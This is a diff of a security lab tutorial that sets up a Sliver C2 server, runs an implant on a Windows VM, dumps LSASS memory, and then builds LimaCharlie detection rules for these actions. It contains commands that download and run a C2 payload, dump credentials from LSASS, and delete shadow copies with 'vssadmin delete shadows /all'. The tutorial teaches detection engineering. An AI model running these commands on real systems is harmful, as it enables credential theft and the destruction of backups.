@@ -268,7 +268,7 @@ $ ping 8.8.8.8
 ```
 4. Now that we have a statically assigned IP address that should not change, let’s **SSH onto the VM** from your host system to make future CLI activities easier thanks to copy/paste magic:
 ```
-$ ssh user@<Linux_VM_IP>
+$ ssh -p 2200 user@127.0.0.1
 ```
 5. Now, from within this new SSH session, proceed with the following instructions to setup our **attacker C2 server**. First, let’s drop into a root shell to make life easier:
 ```
@@ -336,7 +336,7 @@ PS\> IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Dow
     4. If you get an **error starting the HTTP listener**, try rebooting the Linux VM and retrying.
 2. Return to the **Windows VM** and **execute the C2 payload** from its download location using the same **administrative PowerShell prompt** we had from before:
 ```
-PS\> C:\Users\User\Downloads\<your_C2-implant>.exe
+PS\> C:\Users\User\Downloads\[your_C2-implant].exe
 ```
 3. Within a few moments, you should see your **session in the Sliver server**.
 4. Type **sessions** on the **Sliver shell** and take note of the **Session ID**:
@@ -398,7 +398,9 @@ PS\> C:\Users\User\Downloads\<your_C2-implant>.exe
             1. If you **scroll back** far enough, should be able to find the **moment your implant was created on the system**, and **when it was launched shortly after**, and the **network connections it created immediately after**.
             2. Examine the other events related to your implant process, you’ll see it is responsible for other events such as **SENSITIVE_PROCESS_ACCESS** from when we enumerated our privileges in an earlier step. This particular event will be useful later on when we craft our first detection rule.
 
-## Step 9: Let’s Get Adversarial
+# LSASS Access
+
+## Step 9: Let’s Perform the Attack
 1. Get back onto an **SSH session** on the **Linux VM**, and drop into a **C2 session** on your victim.
     1. Retrace your steps from **Step 7** if need be.
 2. Run the following commands within the **Sliver session** on your victim host:
@@ -414,7 +416,7 @@ PS\> C:\Users\User\Downloads\<your_C2-implant>.exe
         1. This will **dump the remote process from memory**, and **save it locally on your Sliver C2 server**. We are not going to further process the lsass dump, but I’ll leave it as an exercise for the reader if you want to try your hand (https://xapax.github.io/security/#attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#mimikatzpypykatz) at it.
         2. **NOTE:** This will fail if you did not launch your C2 payload with admin rights on the Windows system. If it still fails for an unknown reason (RPC error, etc), don’t fret, it likely still generated the telemetry we needed. Move on and see if you can still detect the attempt.
 
-## Step 10: Now Let’s Detect It
+## Step 10: Let’s Create the Detection Rule
 1. Now that we’ve done something adversarial, let’s switch over to
    **LimaCharlie** (https://app.limacharlie.io/) to find the relevant telemetry:
     1. Since **lsass.exe** is a known sensitive process often targeted by credential dumping tools, any good **EDR** will generate events for this.
@@ -444,7 +446,7 @@ PS\> C:\Users\User\Downloads\<your_C2-implant>.exe
                 1. Notice that we have a **Match** and the **D&R engine** tells you exactly what it matched on.
             3. Scroll back up and click **Save Rule** and give it the name **LSASS Accessed** and be sure it is enabled.
 
-## Step 11: Let’s Be Bad Again, Now with Detections!
+## Step 11: Let’s Detect the Attack
 1. Return to your **Sliver server console**, back into your **C2 session**, and **rerun our same procdump command** from the beginning of this post.
     1. If at some point your **C2 session dies**, just **relaunch your malware** with the steps in **Step 7**.
 2. **After rerunning the procdump command**, go to the **Detections** tab on the **LimaCharlie** main left-side menu:
@@ -452,10 +454,10 @@ PS\> C:\Users\User\Downloads\<your_C2-implant>.exe
     2. You’ve just **detected a threat** with your own **detection signature**! Expand a detection to see the raw event
     3. Notice you can also go straight to the **timeline** where this event occurred by clicking **View Event Timeline** from the Detection entry.
 
-# Blocking Attacks
+# Volume Shadow Copies Deletion Using vssadmin
 
 ## Why This Rule?
-1. **Command** used in **Ransonware attacks** to **delete the volume shadow copies** (https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/):
+1. This **command** used in **Ransonware attacks** to **delete the volume shadow copies** (https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/):
 ```
 \> vssadmin delete shadows /all
 ```
